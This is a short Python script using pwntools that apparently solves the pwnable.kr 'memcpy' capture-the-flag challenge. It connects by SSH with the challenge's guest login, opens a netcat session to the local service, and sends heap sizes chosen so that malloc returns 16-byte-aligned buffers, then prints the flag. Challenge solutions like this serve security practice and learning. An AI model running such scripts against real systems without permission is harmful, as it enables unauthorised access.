from pwn import *
session = ssh('memcpy', 'pwnable.kr', port=2222, password='guest')
session.download('memcpy.c')

io = session.process(['nc', '0', '9022'])
# With the xmm register operations, we have to worry about memory alignment.
# Compiling the source and adding prinf statements for the heap addresses we
# get helped solve this. We just need to add 8 to whatever the base 2 number
# is at that experiment to ensure malloc gives us a 16 byte aligned pointer.
io.sendline('8')
io.sendline('24')
io.sendline('40')
io.sendline('72')
io.sendline('136')
io.sendline('264')
io.sendline('520')
io.sendline('1032')
io.sendline('2056')
io.sendline('4104')
io.recvuntil('flag : ')
print(io.recvline())
